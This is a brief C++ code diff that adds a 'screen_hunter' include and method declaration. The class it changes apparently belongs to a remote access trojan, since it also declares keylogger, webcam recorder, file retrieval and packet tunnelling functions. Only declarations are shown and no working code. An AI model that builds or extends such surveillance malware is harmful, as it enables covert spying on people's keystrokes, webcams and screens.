@@ -23,6 +23,7 @@
 #include <thread>
 #include "keylogger.hpp"
 #include "webcam_recorder.hpp"
+#include "screen_hunter.hpp"
 #include "packet_tunnel.hpp"
 #include "common.hpp"
 #include "event_logger.hpp"
@@ -118,6 +119,7 @@ private:
     void get_file();
     void keylogger();
     void webcam_recorder();
+    void screen_hunter();
     
     uint find_open_port();
     void send_packet(uint16_t __packet, int __client_index);    
